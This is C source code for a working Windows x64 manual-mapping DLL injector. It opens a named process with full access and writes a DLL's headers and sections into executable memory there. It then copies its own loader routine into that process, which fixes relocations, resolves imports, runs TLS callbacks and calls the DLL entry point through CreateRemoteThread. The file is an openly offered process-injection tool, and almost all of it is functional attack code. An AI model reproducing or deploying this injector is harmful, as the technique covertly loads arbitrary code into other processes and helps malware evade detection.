#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<string.h>


typedef struct _PE_INFO
{
	LPVOID base;
	BOOL reloc; //For If base relocation is needed
	LPVOID Get_Proc; //Address OF GetProcAddress()
	LPVOID Load_DLL; //Address OF LoadLibraryA()
}PE_INFO , * LPE_INFO;

LPVOID Read_in_Memory(char * FileName)
{
	HANDLE f,h;
	LPVOID mem;
	
	if((f=CreateFileA(FileName,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL))==INVALID_HANDLE_VALUE)
	return NULL;
	
	if((h=CreateFileMappingA(f,NULL,PAGE_READONLY,0,0,NULL))==NULL)
	return NULL;
	
	if((mem=MapViewOfFile(h,FILE_MAP_READ,0,0,0))==NULL)
	return NULL;
	else
	return mem;
	
}

HANDLE Find_Process(char * process_name)
{
	HANDLE snap,proc;
	PROCESSENTRY32 ps;
	BOOL found=0;
	
	ps.dwSize=sizeof(ps);
	
	if((snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0) )==INVALID_HANDLE_VALUE)
	return NULL;
	
	if(!Process32First(snap,&ps))
	return NULL;
	
	do
	{
		if(!strcmp(process_name,ps.szExeFile))
		{
			found=1;
			break;
		}
	}while(Process32Next(snap,&ps));
	
	CloseHandle(snap);
	if(!found)
	return NULL;
	
	if((proc=OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID))==NULL)
	{
		return NULL;
	}
	else
	return proc;
}


void AdjustPE(LPE_INFO pe)
{
	PIMAGE_DOS_HEADER dos;
	PIMAGE_NT_HEADERS nt;
	LPVOID base;
	PIMAGE_IMPORT_DESCRIPTOR import;
	PIMAGE_THUNK_DATA Othunk,Fthunk;
	PIMAGE_BASE_RELOCATION reloc;
	PIMAGE_TLS_DIRECTORY tls;
	PIMAGE_TLS_CALLBACK * CallBack;
	ULONGLONG * p,delta;
	
	BOOL (*DLL_Entry)(LPVOID , DWORD , LPVOID );
	LPVOID (*Load_DLL)(LPSTR );
	LPVOID (*Get_Proc)(LPVOID , LPSTR );
	
	base=pe->base;
	Load_DLL=pe->Load_DLL;
	Get_Proc=pe->Get_Proc;
	
	dos=(PIMAGE_DOS_HEADER)base;
	nt=(PIMAGE_NT_HEADERS)(base+dos->e_lfanew);
	
	DLL_Entry=base+nt->OptionalHeader.AddressOfEntryPoint;
	
	if(!pe->reloc)
	goto Load_Import;
	
	Base_Relocation:
		if(nt->OptionalHeader.DataDirectory[5].VirtualAddress==0) //No Relocation Table Found
		goto Load_Import; 
		delta=(ULONGLONG)base-nt->OptionalHeader.ImageBase;
		reloc=(PIMAGE_BASE_RELOCATION)(base+nt->OptionalHeader.DataDirectory[5].VirtualAddress);
		while(reloc->VirtualAddress)
		{
			LPVOID dest=base+reloc->VirtualAddress;
			int nEntry=(reloc->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;
			PWORD data=(PWORD)((LPVOID)reloc+sizeof(IMAGE_BASE_RELOCATION));
			int i;
			for(i=0;i<nEntry;i++,data++)
			{
				if(((*data)>>12)==10)
				{
					p=(PULONGLONG)(dest+((*data)&0xfff));
					*p+=delta;
				}
			}
			
			reloc=(PIMAGE_BASE_RELOCATION)((LPVOID)reloc+reloc->SizeOfBlock);
			
		}
		//End OF base Relocation
		
	Load_Import:
		if(nt->OptionalHeader.DataDirectory[1].VirtualAddress==0)
		goto TLS_CallBack;
		import=(PIMAGE_IMPORT_DESCRIPTOR)(base+nt->OptionalHeader.DataDirectory[1].VirtualAddress);
		while(import->Name)
		{
			LPVOID dll=(*Load_DLL)(base+import->Name);
			Othunk=(PIMAGE_THUNK_DATA)(base+import->OriginalFirstThunk);
			Fthunk=(PIMAGE_THUNK_DATA)(base+import->FirstThunk);
			
			if(!import->OriginalFirstThunk)
			Othunk=Fthunk;
			
			while(Othunk->u1.AddressOfData)
			{
				if(Othunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				{
					*(ULONGLONG *)Fthunk=(ULONGLONG)(*Get_Proc)(dll,(LPSTR)IMAGE_ORDINAL(Othunk->u1.Ordinal));
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME fnm=(PIMAGE_IMPORT_BY_NAME)(base+Othunk->u1.AddressOfData);
					*(PULONGLONG)Fthunk=(ULONGLONG)(*Get_Proc)(dll,fnm->Name);
				}
				Othunk++;
				Fthunk++;
			}
			import++;
		}
	
	
	TLS_CallBack:
		if(nt->OptionalHeader.DataDirectory[9].VirtualAddress==0)
		goto Execute_Entry;
		tls=(PIMAGE_TLS_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[9].VirtualAddress);
		if(tls->AddressOfCallBacks==0)
		goto Execute_Entry;
		
		CallBack=(PIMAGE_TLS_CALLBACK *)(tls->AddressOfCallBacks);
		while(*CallBack)
		{
			(*CallBack)(base,DLL_PROCESS_ATTACH,NULL);
			CallBack++;
		}
	
	
	Execute_Entry:	
		(*DLL_Entry)(base,DLL_PROCESS_ATTACH,NULL);
	
}


int main(int i,char *arg[])
{

	HANDLE proc;
	LPVOID base,Rbase,Adj;
	PIMAGE_DOS_HEADER dos;
	PIMAGE_SECTION_HEADER sec;
	PIMAGE_NT_HEADERS nt;
	DWORD Func_Size;
	PE_INFO pe;
	
	if(i!=3)
	{
		printf("[!]Usage %s <DLL> <Process>\n",arg[0]);
		return 0;
	}
	
	printf("[+]Opening File...\n");
	
	if((base=Read_in_Memory(arg[1]))==NULL)
	{
		printf("[-]File I/O Error");
		return 0;
	}
	
	dos=(PIMAGE_DOS_HEADER)base;
	
	if(dos->e_magic!=23117)
	{
		printf("[-]Invalid File");
		return 0;
	}
	
	nt=(PIMAGE_NT_HEADERS)(base+dos->e_lfanew);
	sec=(PIMAGE_SECTION_HEADER)((LPVOID)nt+24+nt->FileHeader.SizeOfOptionalHeader);
	
	if(nt->OptionalHeader.Magic!=IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		printf("[-]This is not 64 bit pe");
		return 0;
	}
	
	printf("\n[+]Open Process.....");
	
	if((proc=Find_Process(arg[2]))==NULL)
	{
		printf("[-]Failed To Open Process");
		return 0;
	}
	
	printf("[+]Allocating Memory Into Remote Process");
	
	pe.reloc=0;
	
	if((Rbase=VirtualAllocEx(proc,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
	{
		printf("\n[!]Failed To Allocate Memory AT %#p\n[!]Trying Alternative\n",nt->OptionalHeader.ImageBase);
		pe.reloc=1;
		if((Rbase=VirtualAllocEx(proc,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
		{
			printf("[-]Failed To Allocate Memory Into Remote Process");
			return 0;
		}
	}
	
	printf("\n[+]Copying Headers");
	WriteProcessMemory(proc,Rbase,base,nt->OptionalHeader.SizeOfHeaders,NULL);
	printf("\n[+]Copying Sections...");
	for(i=0;i<nt->FileHeader.NumberOfSections;i++)
	{
		WriteProcessMemory(proc,Rbase+sec->VirtualAddress,base+sec->PointerToRawData,sec->SizeOfRawData,NULL);
		sec++;
	}
	
	Func_Size=(DWORD)((ULONGLONG)main-(ULONGLONG)AdjustPE);
	pe.base=Rbase;
	pe.Get_Proc=GetProcAddress;
	pe.Load_DLL=LoadLibraryA;
	
	if((Adj=VirtualAllocEx(proc,NULL,Func_Size+sizeof(pe),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
	{
		printf("\n[-]Failed To Allocate Memory for PE adjusting");
		VirtualFreeEx(proc,Rbase,0,MEM_RELEASE);
		return 0;
	}
	
	WriteProcessMemory(proc,Adj,&pe,sizeof(pe),NULL);
	WriteProcessMemory(proc,Adj+sizeof(pe),AdjustPE,Func_Size,NULL);
	if(!CreateRemoteThread(proc,NULL,0,(LPTHREAD_START_ROUTINE)(Adj+sizeof(pe)),Adj,0,NULL))
	printf("\n[-]Failed TO Adjust PE");
	else
	printf("\n[+]Adjusting PE And Executing....");
	
	return 0;
	
}
